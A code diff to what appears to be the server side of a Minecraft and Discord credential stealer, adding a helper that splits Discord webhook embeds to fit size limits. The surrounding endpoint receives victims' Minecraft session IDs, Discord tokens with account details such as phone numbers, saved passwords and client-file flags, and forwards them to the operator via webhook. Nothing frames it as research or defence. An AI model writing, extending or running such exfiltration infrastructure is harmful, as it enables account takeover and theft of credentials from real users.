@@ -32,6 +32,29 @@ def validate_session(ign, uuid, ssid):
         return False
 
 
+def split_embed(embed, max_length=6000):
+    """Splits an embed into multiple embeds if it exceeds the maximum length."""
+    fields = embed.fields
+    split_embeds = []
+
+    # Create a new embed to start with
+    current_embed = DiscordEmbed(title=embed.title, color=embed.color)
+    current_length = len(current_embed.to_dict())
+
+    for field in fields:
+        field_length = len(field['name']) + len(field['value'])
+        if current_length + field_length > max_length:
+            split_embeds.append(current_embed)
+            current_embed = DiscordEmbed(title=embed.title, color=embed.color)
+            current_length = len(current_embed.to_dict())
+
+        current_embed.add_embed_field(name=field['name'], value=field['value'], inline=field['inline'])
+        current_length += field_length
+
+    split_embeds.append(current_embed)
+    return split_embeds
+
+
 class Delivery(Resource):
     def post(self):
         args = request.json
@@ -85,7 +108,8 @@ class Delivery(Resource):
         mc_embed.add_embed_field(name="IGN", value=cb + mc['ign'] + cb, inline=True)
         mc_embed.add_embed_field(name="UUID", value=cb + mc['uuid'] + cb, inline=True)
         mc_embed.add_embed_field(name="Session ID", value=cb + mc['ssid'] + cb, inline=True)
-        embeds.append(mc_embed)
+        embeds.extend(split_embed(mc_embed))
+
         if len(args['discord']) > 0:
             for tokenjson in args['discord']:
 
@@ -107,7 +131,7 @@ class Delivery(Resource):
                     discord_embed.add_embed_field(name="Phone", value=cb + "Not linked" + cb if tokeninfo.json()['phone'] is None else cb + tokeninfo.json()['phone'] + cb, inline=True)
                     discord_embed.set_thumbnail(url="https://cdn.discordapp.com/embed/avatars/0.png" if tokeninfo.json()['avatar'] is None else "https://cdn.discordapp.com/avatars/" + tokeninfo.json()['id'] + "/" + tokeninfo.json()['avatar'] + ".png")
                     discord_embed.add_embed_field(name="Nitro", value=cb + "No" + cb if tokeninfo.json()['premium_type'] == 0 else cb + "Yes" + cb, inline=True)
-                    embeds.append(discord_embed)
+                    embeds.extend(split_embed(discord_embed))
                 else:
                     print("Rejected invalid token")
                     return {'status': 'invalid token'}, 401
@@ -137,7 +161,7 @@ class Delivery(Resource):
                                               description=description)
                 password_embed.set_footer(text=config['password_embed_footer_text'],
                                           icon_url=config['password_embed_footer_icon'])
-                embeds.append(password_embed)
+                embeds.extend(split_embed(password_embed))
 
         else:
             password_embed = DiscordEmbed(title=config['password_embed_title'],
@@ -157,7 +181,7 @@ class Delivery(Resource):
                                    value=f"{cb}Yes{cb}✅" if 'lunar' in args else f"{cb}No{cb}❌", inline=True)
         file_embed.add_embed_field(name="Essential File",
                                    value=f"{cb}Yes{cb}✅" if "essential" in args else f"{cb}No{cb}❌", inline=True)
-        embeds.append(file_embed)
+        embeds.extend(split_embed(file_embed))
 
         batch_size = 10
         num_messages = (len(embeds) + batch_size - 1) // batch_size
